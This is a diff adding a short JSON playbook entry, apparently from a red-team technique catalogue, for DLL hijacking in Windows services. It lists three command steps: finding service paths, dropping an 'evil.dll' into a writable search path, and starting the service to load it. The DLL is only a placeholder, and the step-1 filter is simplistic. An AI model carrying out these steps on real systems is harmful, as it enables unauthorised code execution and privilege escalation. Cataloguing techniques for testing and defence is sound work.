@@ -1,0 +1,25 @@
+{
+	"name": "DLL Hijacking in Services",
+	"description": "Exploit DLL search order in services to load malicious library.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Identify DLL Load Paths",
+			"command": "wmic service get name,pathname | findstr /i vulnerable",
+			"description": "Find services loading from writable dirs."
+		},
+		{
+			"index": 2,
+			"name": "Place Malicious DLL",
+			"command": "copy evil.dll \"C:\\ProgramData\\App\\missing.dll\"",
+			"description": "Drop DLL in search path."
+		},
+		{
+			"index": 3,
+			"name": "Trigger Load",
+			"command": "sc start VulnerableService",
+			"description": "Service loads and executes DLL."
+		}
+	]
+}
